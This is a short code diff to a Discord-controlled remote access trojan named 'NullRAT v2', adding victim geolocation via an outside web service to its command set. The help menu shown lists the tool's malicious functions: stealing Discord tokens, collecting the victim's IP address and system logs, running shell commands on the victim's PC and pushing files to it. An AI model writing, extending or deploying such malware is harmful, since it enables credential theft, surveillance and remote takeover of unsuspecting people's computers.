@@ -70,7 +70,7 @@ async def exit(ctx, ip):
         await client.logout()
 
 @client.command()
-async def geolocate(ctx):
+async def geolocate(ctx): # Powered by geolocation-db
     import urllib.request, json
     with urllib.request.urlopen("https://geolocation-db.com/json") as url:
         data = json.loads(url.read().decode())
@@ -236,6 +236,7 @@ async def menu(ctx):
     embed = discord.Embed(title="NullRAT v2 Help Menu", color=0x0081FA)
     embed.add_field(name="rat> token", value="Finds Discord Token", inline=False)
     embed.add_field(name="rat> userip", value="Finds victim's public IP address", inline=False)
+    embed.add_field(name="rat> geolocation", value="Finds victim's geolocation information", inline=False)
     embed.add_field(name="rat> gsl", value="Sends a general system log", inline=False)
     embed.add_field(name='rat> shell "`cmd`"', value="Executes shell commands", inline=False)
     embed.add_field(name="rat> upload <name> <link>", value="Sends file to victim's PC", inline=False)
